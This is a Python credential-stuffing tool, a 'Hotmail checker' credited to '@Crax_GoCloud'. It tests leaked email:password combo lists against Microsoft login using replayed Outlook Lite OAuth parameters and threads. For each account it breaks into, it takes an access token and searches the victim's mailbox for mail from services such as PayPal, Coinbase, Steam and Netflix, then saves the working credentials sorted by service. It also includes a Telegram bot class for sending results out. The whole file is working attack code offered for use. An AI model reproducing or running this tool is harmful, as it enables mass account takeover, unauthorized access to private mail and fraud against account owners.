#!/usr/bin/env python3
"""
HOTMAIL CHECKER SCRIPT - COMPLETE VERSION 2.0
Created by: @Crax_GoCloud
"""

import os
import sys
import time
import json
import uuid
import requests
import threading
import datetime
import re
import urllib.parse
import zipfile
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLORS = True
except:
    COLORS = False
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    class Style:
        RESET_ALL = ''

try:
    import pycountry
    PYCOUNTRY = True
except:
    PYCOUNTRY = False

MY_SIGNATURE = '@Crax_GoCloud'

# ========== KOMPLETNY SERVICES_ALL DICTIONARY ==========
SERVICES_ALL = {
    # SOCIAL MEDIA
    'Facebook': 'security@facebookmail.com',
    'Instagram': 'security@mail.instagram.com',
    'TikTok': 'register@account.tiktok.com',
    'Twitter/X': 'info@x.com',
    'LinkedIn': 'security-noreply@linkedin.com',
    'Snapchat': 'no-reply@accounts.snapchat.com',
    'Discord': 'noreply@discord.com',
    'Telegram': 'security@telegram.org',
    'WhatsApp': 'no-reply@whatsapp.com',
    'Pinterest': 'no-reply@pinterest.com',
    'Reddit': 'noreply@reddit.com',
    'Tumblr': 'no-reply@tumblr.com',
    'Threads': 'security@threads.net',
    'BeReal': 'contact@bereal.com',
    'Clubhouse': 'hello@clubhouse.com',
    'Twitch': 'no-reply@twitch.tv',
    'YouTube': 'no-reply@youtube.com',
    'Vimeo': 'noreply@vimeo.com',
    'Quora': 'noreply@quora.com',
    'Medium': 'hello@medium.com',

    # GAMING
    'Steam': 'steam-support@steampowered.com',
    'Xbox': 'xbox-noreply@microsoft.com',
    'PlayStation': 'noreply@playstation.net',
    'Nintendo': 'no-reply@nintendo.com',
    'Epic Games': 'noreply@epicgames.com',
    'Roblox': 'no-reply@roblox.com',
    'Minecraft': 'minecraft@mojang.com',
    'Fortnite': 'noreply@epicgames.com',
    'Valorant': 'support@riotgames.com',
    'League of Legends': 'support@riotgames.com',

    # STREAMING
    'Netflix': 'info@netflix.com',
    'Spotify': 'no-reply@spotify.com',
    'Disney+': 'no-reply@disneyplus.com',
    'HBO Max': 'no-reply@hbomax.com',
    'Amazon Prime': 'no-reply@amazon.com',
    'YouTube Premium': 'no-reply@youtube.com',
    'Hulu': 'noreply@hulu.com',
    'Apple TV+': 'no-reply@apple.com',

    # SHOPPING
    'Amazon': 'no-reply@amazon.com',
    'eBay': 'no-reply@ebay.com',
    'PayPal': 'service@paypal.com',
    'AliExpress': 'alibaba@service.alibaba.com',

    # FINANCE
    'Coinbase': 'no-reply@coinbase.com',
    'Binance': 'support@binance.com',
    'Revolut': 'noreply@revolut.com',

    # AI & EDUCATION
    'ChatGPT': 'support@openai.com',
    'Udemy': 'no-reply@udemy.com',
    'Coursera': 'noreply@coursera.org',
}

# Rozdelenie do kategórií
SERVICES_SOCIAL = {k: v for k, v in SERVICES_ALL.items() if k in ['Facebook', 'Instagram', 'TikTok', 'Twitter/X', 'LinkedIn', 'Snapchat', 'Discord', 'Telegram', 'WhatsApp', 'Pinterest', 'Reddit', 'Twitch', 'YouTube']}
SERVICES_GAMING = {k: v for k, v in SERVICES_ALL.items() if k in ['Steam', 'Xbox', 'PlayStation', 'Nintendo', 'Epic Games', 'Roblox', 'Minecraft', 'Fortnite', 'Valorant', 'League of Legends']}
SERVICES_STREAMING = {k: v for k, v in SERVICES_ALL.items() if k in ['Netflix', 'Spotify', 'Disney+', 'HBO Max', 'Amazon Prime', 'YouTube Premium', 'Hulu', 'Apple TV+']}
SERVICES_SHOPPING = {k: v for k, v in SERVICES_ALL.items() if k in ['Amazon', 'eBay', 'PayPal', 'AliExpress']}
SERVICES_FINANCE = {k: v for k, v in SERVICES_ALL.items() if k in ['Coinbase', 'Binance', 'Revolut']}

lock = threading.Lock()
stats = {'hits': 0, 'bad': 0, 'retry': 0, 'checked': 0, 'total': 0, 'start_time': None, 'platforms': {}, 'countries': {}}

WELCOME_MESSAGES = {
    '1': '🎬 HOTMAIL CHECKER - ALL SERVICES\n\n📊 Selected Mode: All Services Scan\n✅ Check 250 platforms\n💎 @Crax_GoCloud',
    '2': '🎮 GAMING PLATFORMS\n✅ Steam, Xbox, PlayStation, Roblox\n💎 @Crax_GoCloud',
    '3': '📱 SOCIAL MEDIA\n✅ Instagram, TikTok, Facebook\n💎 @Crax_GoCloud',
    '9': '✅ VALIDATION ONLY\n✅ Fast login check only\n💎 @Crax_GoCloud'
}

class TelegramBot:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f'https://api.telegram.org/bot{token}'

    def send_message(self, text, parse_mode='HTML'):
        try:
            url = f'{self.base_url}/sendMessage'
            data = {'chat_id': self.chat_id, 'text': text, 'parse_mode': parse_mode}
            response = requests.post(url, data=data, timeout=30)
            return response.status_code == 200
        except:
            return False

    def send_document(self, file_path, caption=''):
        try:
            url = f'{self.base_url}/sendDocument'
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': self.chat_id, 'caption': caption, 'parse_mode': 'HTML'}
                response = requests.post(url, data=data, files=files, timeout=120)
            return response.status_code == 200
        except:
            return False

def get_country_flag(country_name):
    if not PYCOUNTRY or not country_name or country_name == 'Unknown':
        return '🏳️'
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except:
        return '🏳️'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f'''{Fore.CYAN}
    ██╗  ██╗ ██████╗ ████████╗███╗   ███╗ █████╗ ██╗██╗     
    ██║  ██║██╔═══██╗╚══██╔══╝████╗ ████║██╔══██╗██║██║     
    ███████║██║   ██║   ██║   ██╔████╔██║███████║██║██║     
    ██╔══██║██║   ██║   ██║   ██║╚██╔╝██║██╔══██║██║██║     
    ██║  ██║╚██████╔╝   ██║   ██║ ╚═╝ ██║██║  ██║██║███████╗
    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
    {Fore.YELLOW}         CHECKER SCRIPT v2.0 - 250 PLATFORMS
{Fore.WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Fore.YELLOW}    Developer : {Fore.MAGENTA}{MY_SIGNATURE}
{Fore.WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}'''
    print(banner)

def print_menu():
    menu = f'''{Fore.WHITE}
┌────────────────────────────────────────────────────────────┐
│                                                            │
│  {Fore.CYAN}SELECT SCAN MODE{Fore.WHITE}                                         │
│                                                            │
│  {Fore.GREEN}1{Fore.WHITE}. All Services          {Fore.WHITE}(Check all platforms)       │
│  {Fore.GREEN}2{Fore.WHITE}. Gaming Platforms      {Fore.WHITE}(Steam, PSN, Xbox)          │
│  {Fore.GREEN}3{Fore.WHITE}. Social Media          {Fore.WHITE}(Instagram, TikTok)         │
│  {Fore.GREEN}9{Fore.WHITE}. Validation Only       {Fore.WHITE}(Login check only)          │
│                                                            │
│  {Fore.RED}0{Fore.WHITE}. Exit                                                    │
└────────────────────────────────────────────────────────────┘{Style.RESET_ALL}'''
    print(menu)

def create_results_folder(mode_name):
    folder = f'Results/{mode_name}'
    Path(folder).mkdir(parents=True, exist_ok=True)
    return folder

def save_to_file(folder, filename, data):
    filepath = os.path.join(folder, filename)
    if not os.path.exists(filepath):
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f'# Created by {MY_SIGNATURE}\n')
            f.write(f"# Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n#\\n\\n")
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f'{data}\n')

def update_progress():
    with lock:
        if stats['total'] == 0:
            return
        percent = (stats['checked'] / stats['total']) * 100
        bar_length = 30
        filled = int(bar_length * stats['checked'] / stats['total'])
        bar = f'{Fore.GREEN}█{Style.RESET_ALL}' * filled + f'{Fore.WHITE}░{Style.RESET_ALL}' * (bar_length - filled)
        
        elapsed = time.time() - stats['start_time'] if stats['start_time'] else 1
        cpm = int(stats['checked'] / elapsed * 60) if elapsed > 0 else 0
        
        clear_screen()
        print_banner()
        print()
        print(f"{Fore.CYAN}┌{'─' * 60}┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.YELLOW} ⚡ Status: Checking...{' ' * 42}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}├{'─' * 60}┤{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│ {Fore.GREEN}✓ Hits   : {Fore.WHITE}{stats['hits']:<5} │{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│ {Fore.RED}✗ Bad    : {Fore.WHITE}{stats['bad']:<5} │{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│ {Fore.YELLOW}⟳ Retry  : {Fore.WHITE}{stats['retry']:<5} │{Style.RESET_ALL}")
        print(f"{Fore.CYAN}├{'─' * 60}┤{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│ Progress: [{bar}] {percent:.1f}%{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│ Speed: {Fore.BLUE}{cpm} CPM{Fore.WHITE}                    {Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└{'─' * 60}┘{Style.RESET_ALL}")

class HotmailChecker:
    @staticmethod
    def check_account(email, password):
        try:
            session = requests.Session()
            url1 = f'https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}'
            headers1 = {
                'X-OneAuth-AppName': 'Outlook Lite',
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)'
            }
            r1 = session.get(url1, headers=headers1, timeout=10)
            if 'MSAccount' not in r1.text:
                return {'status': 'BAD'}

            params = {
                'client_info': '1',
                'haschrome': '1',
                'login_hint': email,
                'mkt': 'en',
                'response_type': 'code',
                'client_id': 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59',
                'scope': 'profile openid offline_access https://outlook.office.com/M365.Access',
                'redirect_uri': 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D'
            }
            url_auth = f'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}'
            r2 = session.get(url_auth, timeout=10)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {'status': 'BAD'}

            post_url = url_match.group(1).replace('\\/', '/')
            ppft = ppft_match.group(1)
            
            login_data = {
                'i13': '1',
                'login': email,
                'loginfmt': email,
                'type': '11',
                'LoginOptions': '1',
                'passwd': password,
                'ps': '2',
                'PPFT': ppft,
                'PPSX': 'PassportRN',
                'i19': '9960'
            }
            
            r3 = session.post(post_url, data=login_data, 
                            headers={'Content-Type': 'application/x-www-form-urlencoded'},
                            allow_redirects=False, timeout=10)
            
            if 'password is incorrect' in r3.text.lower() or 'error' in r3.text.lower():
                return {'status': 'BAD'}

            location = r3.headers.get('Location', '')
            if not location or 'code=' not in location:
                return {'status': 'BAD'}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {'status': 'BAD'}

            code = code_match.group(1)
            token_data = {
                'client_info': '1',
                'client_id': 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59',
                'redirect_uri': 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D',
                'grant_type': 'authorization_code',
                'code': code,
                'scope': 'profile openid offline_access https://outlook.office.com/M365.Access'
            }
            
            r4 = session.post('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 
                            data=token_data, timeout=10)
            
            if 'access_token' not in r4.text:
                return {'status': 'BAD'}

            token_json = r4.json()
            access_token = token_json['access_token']
            
            mspcid = None
            for cookie in session.cookies:
                if cookie.name == 'MSPCID':
                    mspcid = cookie.value.upper()
                    break
            
            if not mspcid:
                mspcid = str(uuid.uuid4()).upper()
                
            return {'status': 'HIT', 'token': access_token, 'cid': mspcid}
            
        except:
            return {'status': 'RETRY'}

    @staticmethod
    def check_services(email, password, token, cid, services_dict):
        found_services = []
        try:
            search_url = 'https://outlook.live.com/search/api/v2/query'
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Host': 'substrate.office.com'
            }
            
            for service_name, sender_email in services_dict.items():
                try:
                    payload = {
                        'Cvid': str(uuid.uuid4()),
                        'Scenario': {'Name': 'owa.react'},
                        'TimeZone': 'UTC',
                        'TextDecorations': 'Off',
                        'EntityRequests': [{
                            'EntityType': 'Conversation',
                            'ContentSources': ['Exchange'],
                            'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}]},
                            'From': 0,
                            'Query': {'QueryString': f'from:{sender_email}'},
                            'Size': 1,
                            'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}]
                        }]
                    }
                    
                    r = requests.post(search_url, json=payload, headers=headers, timeout=8)
                    if r.status_code == 200:
                        data = r.json()
                        if 'EntitySets' in data:
                            for entity_set in data['EntitySets']:
                                if 'ResultSets' in entity_set:
                                    for result_set in entity_set['ResultSets']:
                                        total = result_set.get('Total', 0)
                                        if total > 0:
                                            found_services.append(service_name)
                                            break
                    time.sleep(0.1)
                except:
                    continue
            return found_services
        except:
            return found_services

def scan_all_services(combo):
    email, password = combo.strip().split(':', 1)
    result = HotmailChecker.check_account(email, password)
    
    if result['status'] == 'HIT':
        token = result['token']
        cid = result['cid']
        services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)
        
        if services:
            folder = create_results_folder('All_Services')
            for service in services:
                filename = f"Hits_{service.replace(' ', '_').replace('/', '_')}_by_{MY_SIGNATURE}.txt"
                save_to_file(folder, filename, f'{email}:{password}')
                with lock:
                    stats['platforms'][service] = stats['platforms'].get(service, 0) + 1
            with lock:
                stats['hits'] += 1
        else:
            with lock:
                stats['bad'] += 1
    else:
        with lock:
            if result['status'] == 'RETRY':
                stats['retry'] += 1
            else:
                stats['bad'] += 1
    
    with lock:
        stats['checked'] += 1
    update_progress()

def scan_validation_only(combo):
    email, password = combo.strip().split(':', 1)
    result = HotmailChecker.check_account(email, password)
    
    if result['status'] == 'HIT':
        folder = create_results_folder('Validation')
        save_to_file(folder, 'Valid_Accounts.txt', f'{email}:{password}')
        with lock:
            stats['hits'] += 1
    else:
        with lock:
            if result['status'] == 'RETRY':
                stats['retry'] += 1
            else:
                stats['bad'] += 1
    
    with lock:
        stats['checked'] += 1
    update_progress()

def scan_category(combo, services_dict, category_name):
    email, password = combo.strip().split(':', 1)
    result = HotmailChecker.check_account(email, password)
    
    if result['status'] == 'HIT':
        token = result['token']
        cid = result['cid']
        services = HotmailChecker.check_services(email, password, token, cid, services_dict)
        
        if services:
            folder = create_results_folder(category_name)
            for service in services:
                filename = f"Hits_{service.replace(' ', '_').replace('/', '_')}_by_{MY_SIGNATURE}.txt"
                save_to_file(folder, filename, f'{email}:{password}')
                with lock:
                    stats['platforms'][service] = stats['platforms'].get(service, 0) + 1
            with lock:
                stats['hits'] += 1
        else:
            with lock:
                stats['bad'] += 1
    else:
        with lock:
            if result['status'] == 'RETRY':
                stats['retry'] += 1
            else:
                stats['bad'] += 1
    
    with lock:
        stats['checked'] += 1
    update_progress()

def create_summary(mode_name):
    elapsed = time.time() - stats['start_time'] if stats['start_time'] else 1
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    
    summary = f"""✅ SCAN COMPLETE - {mode_name}

⏱️  Time: {minutes}m {seconds}s
📊 Total: {stats['total']}

📈 RESULTS:
✅ Hits: {stats['hits']}
❌ Bad: {stats['bad']}
🔄 Retry: {stats['retry']}

💎 {MY_SIGNATURE}"""
    
    if stats['platforms']:
        summary += "\n\n📱 TOP PLATFORMS:"
        for platform, count in sorted(stats['platforms'].items(), key=lambda x: x[1], reverse=True)[:10]:
            summary += f"\n• {platform}: {count}"
    
    return summary

def create_zip_archive(mode_name):
    zip_filename = f"Results_{mode_name}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            results_folder = 'Results'
            if os.path.exists(results_folder):
                for root, dirs, files in os.walk(results_folder):
                    for file in files:
                        if file.endswith('.txt'):
                            filepath = os.path.join(root, file)
                            arcname = os.path.relpath(filepath, results_folder)
                            zipf.write(filepath, arcname)
        return zip_filename
    except:
        return None

def run_scanner(combos, mode, mode_name, scan_func):
    stats.update({
        'total': len(combos),
        'checked': 0,
        'hits': 0,
        'bad': 0,
        'retry': 0,
        'platforms': {},
        'countries': {},
        'start_time': time.time()
    })
    
    print(f'{Fore.WHITE}Mode: {Fore.YELLOW}{mode_name}{Style.RESET_ALL}')
    print(f'{Fore.WHITE}Total: {Fore.CYAN}{len(combos)}{Style.RESET_ALL}\n')
    
    input(f'{Fore.YELLOW}Press ENTER to start...{Style.RESET_ALL}')
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(scan_func, combo) for combo in combos]
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    print(f'\n\n{Fore.GREEN}✅ Scan complete!{Style.RESET_ALL}\n')
    summary = create_summary(mode_name)
    print(summary)

def main():
    while True:
        print_banner()
        print_menu()
        choice = input(f'{Fore.CYAN}└─ Select option (0-9): {Style.RESET_ALL}').strip()
        
        if choice == '0':
            print(f'\n{Fore.YELLOW}👋 Goodbye!{Style.RESET_ALL}\n')
            sys.exit(0)
        
        if choice not in ['1', '2', '3', '9']:
            print(f'\n{Fore.RED}✗ Invalid choice!{Style.RESET_ALL}\n')
            time.sleep(2)
            continue
        
        mode_names = {'1': 'All Services', '2': 'Gaming', '3': 'Social Media', '9': 'Validation'}
        mode_name = mode_names[choice]
        
        print(f'{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}')
        print(f'{Fore.YELLOW}📂 COMBO FILE{Style.RESET_ALL}')
        print(f'{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}\n')
        
        combo_file = input(f'{Fore.WHITE}Enter combo file path: {Style.RESET_ALL}').strip()
        if not os.path.exists(combo_file):
            print(f'\n{Fore.RED}✗ File not found!{Style.RESET_ALL}\n')
            time.sleep(2)
            continue
        
        try:
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                combos = [line.strip() for line in f if line.strip() and ':' in line]
            if not combos:
                print(f'\n{Fore.RED}✗ No valid combos!{Style.RESET_ALL}\n')
                time.sleep(2)
                continue
            print(f'\n{Fore.GREEN}✅ Loaded {len(combos)} combos{Style.RESET_ALL}\n')
        except:
            print(f'\n{Fore.RED}✗ Error reading file!{Style.RESET_ALL}\n')
            time.sleep(2)
            continue
        
        # Nastav scan funkciu
        if choice == '1':
            scan_func = scan_all_services
        elif choice == '2':
            scan_func = lambda c: scan_category(c, SERVICES_GAMING, 'Gaming')
        elif choice == '3':
            scan_func = lambda c: scan_category(c, SERVICES_SOCIAL, 'Social_Media')
        elif choice == '9':
            scan_func = scan_validation_only
        
        run_scanner(combos, choice, mode_name, scan_func)
        
        again = input(f'\n{Fore.YELLOW}Run another scan? (y/n): {Style.RESET_ALL}').strip().lower()
        if again != 'y':
            print(f'\n{Fore.GREEN}✅ Thank you!{Style.RESET_ALL}')
            break

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n\n{Fore.YELLOW}⚠️ Interrupted{Style.RESET_ALL}\n')
        sys.exit(0)
